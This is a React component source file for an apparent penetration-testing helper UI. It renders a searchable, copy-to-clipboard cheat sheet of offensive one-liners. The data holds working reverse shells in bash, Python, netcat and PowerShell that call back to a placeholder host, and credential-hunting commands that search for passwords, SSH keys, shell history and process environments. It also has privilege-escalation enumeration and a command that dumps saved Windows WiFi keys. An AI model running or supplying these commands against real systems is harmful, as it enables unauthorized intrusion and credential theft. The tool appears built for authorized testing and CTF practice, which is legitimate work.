// @ts-nocheck
import { useState } from 'react'
import { useTargetCtx } from '../hooks/TargetContext'

const ONELINERS = [
  { cat: 'Shell Upgrades', items: [
    { name: 'Spawn TTY (Python)', cmd: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'" },
    { name: 'Full TTY upgrade', cmd: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n# Ctrl+Z\nstty raw -echo; fg\nexport TERM=xterm\nstty rows 40 cols 160" },
    { name: 'Script TTY', cmd: '/usr/bin/script -qc /bin/bash /dev/null' },
  ]},
  { cat: 'File Transfer', items: [
    { name: 'Python HTTP server', cmd: 'python3 -m http.server 80' },
    { name: 'wget to target', cmd: 'wget http://{TARGET_IP}/file -O /tmp/file' },
    { name: 'curl to target', cmd: 'curl http://{TARGET_IP}/file -o /tmp/file' },
    { name: 'Certutil (Windows)', cmd: 'certutil -urlcache -split -f http://{TARGET_IP}/file C:\\Windows\\Temp\\file' },
    { name: 'PowerShell download', cmd: 'iwr http://{TARGET_IP}/file -OutFile C:\\Temp\\file' },
    { name: 'SCP upload', cmd: 'scp file {USERNAME}@{TARGET_IP}:/tmp/' },
    { name: 'Base64 transfer', cmd: "base64 -w0 file | xclip -sel clip\n# On target:\necho '<paste>' | base64 -d > file" },
  ]},
  { cat: 'Enumeration', items: [
    { name: 'Find SUID binaries', cmd: 'find / -perm -4000 -type f 2>/dev/null' },
    { name: 'Find writable dirs', cmd: 'find / -writable -type d 2>/dev/null' },
    { name: 'Find capabilities', cmd: 'getcap -r / 2>/dev/null' },
    { name: 'List cron jobs', cmd: 'cat /etc/crontab; ls -la /etc/cron.*; crontab -l' },
    { name: 'Internal ports', cmd: 'ss -tlnp' },
    { name: 'Running processes', cmd: 'ps auxf' },
    { name: 'OS info', cmd: 'cat /etc/os-release; uname -a; arch' },
    { name: 'Users with shell', cmd: "grep -v 'nologin\\|false' /etc/passwd" },
  ]},
  { cat: 'Reverse Shells', items: [
    { name: 'Bash', cmd: 'bash -i >& /dev/tcp/{TARGET_IP}/4444 0>&1' },
    { name: 'Python', cmd: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{TARGET_IP}\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])'" },
    { name: 'Netcat (mkfifo)', cmd: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {TARGET_IP} 4444 >/tmp/f' },
    { name: 'PowerShell', cmd: "$client = New-Object System.Net.Sockets.TCPClient('{TARGET_IP}',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}" },
  ]},
  { cat: 'Listeners', items: [
    { name: 'Netcat listener', cmd: 'nc -lvnp 4444' },
    { name: 'Rlwrap listener', cmd: 'rlwrap nc -lvnp 4444' },
    { name: 'Socat listener', cmd: 'socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash' },
    { name: 'Pwncat listener', cmd: 'pwncat-cs -lp 4444' },
  ]},
  { cat: 'Credential Hunting', items: [
    { name: 'Find passwords in files', cmd: "grep -rli 'password\\|passwd\\|pwd\\|secret' /etc/ /opt/ /var/ 2>/dev/null" },
    { name: 'History files', cmd: 'cat ~/.*history 2>/dev/null' },
    { name: 'SSH keys', cmd: 'find / -name id_rsa -o -name id_ed25519 2>/dev/null' },
    { name: 'Config files', cmd: "find / -name '*.conf' -o -name '*.config' -o -name '*.ini' 2>/dev/null | head -30" },
    { name: 'Environment variables', cmd: 'env; cat /proc/*/environ 2>/dev/null | tr "\\0" "\\n" | grep -i pass' },
  ]},
  { cat: 'Windows Quick Wins', items: [
    { name: 'Whoami all', cmd: 'whoami /all' },
    { name: 'Check privileges', cmd: 'whoami /priv' },
    { name: 'Stored credentials', cmd: 'cmdkey /list' },
    { name: 'Saved WiFi passwords', cmd: 'netsh wlan show profiles\nnetsh wlan show profile name="SSID" key=clear' },
    { name: 'Unquoted service paths', cmd: 'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows"' },
    { name: 'AlwaysInstallElevated', cmd: 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated' },
  ]},
]

function CopyBtn({ text }) {
  const [copied, setCopied] = useState(false)
  const copy = () => { navigator.clipboard.writeText(text); setCopied(true); setTimeout(() => setCopied(false), 1500) }
  return <button className={`copy-btn ${copied ? 'copied' : ''}`} onClick={copy}>{copied ? '✓ COPIED' : 'COPY'}</button>
}

export default function QuickRef() {
  const [filter, setFilter] = useState('')
  const { inject } = useTargetCtx()

  const q = filter.toLowerCase()
  const filtered = ONELINERS.map(section => ({
    ...section,
    items: section.items.filter(i => !q || i.name.toLowerCase().includes(q) || i.cmd.toLowerCase().includes(q) || section.cat.toLowerCase().includes(q))
  })).filter(s => s.items.length > 0)

  return (
    <div style={{ padding: '0.5rem' }}>
      <input value={filter} onChange={e => setFilter(e.target.value)} placeholder="search one-liners..."
        style={{ width: '100%', background: '#030303', border: '1px solid #1a1a1a', color: 'var(--neon)', fontFamily: 'inherit', fontSize: '0.68rem', padding: '0.4rem 0.6rem', outline: 'none', marginBottom: '0.75rem' }} />

      {filtered.map(section => (
        <div key={section.cat} style={{ marginBottom: '1.25rem' }}>
          <div style={{ fontSize: '0.7rem', color: 'var(--neon)', fontWeight: 700, marginBottom: '0.4rem', letterSpacing: '0.05em' }}>{section.cat}</div>
          {section.items.map(item => (
            <div key={item.name} style={{ marginBottom: '0.5rem', borderLeft: '2px solid #1a1a1a', paddingLeft: '0.6rem' }}>
              <div style={{ fontSize: '0.62rem', color: '#888', marginBottom: '0.2rem' }}>{item.name}</div>
              <div className="cmd-block" style={{ margin: 0, padding: '0.4rem 0.6rem', position: 'relative' }}>
                {inject(item.cmd).split('\n').map((line, i) => (
                  <div key={i}>
                    {line.startsWith('#') ? <span style={{ color: '#555' }}>{line}</span>
                      : <>{line.split(/(\{[A-Z_]+\})/g).map((p, j) =>
                        /^\{[A-Z_]+\}$/.test(p) ? <span key={j} className="cmd-placeholder">{p}</span> : <span key={j}>{p}</span>
                      )}</>}
                  </div>
                ))}
                <CopyBtn text={inject(item.cmd)} />
              </div>
            </div>
          ))}
        </div>
      ))}
    </div>
  )
}
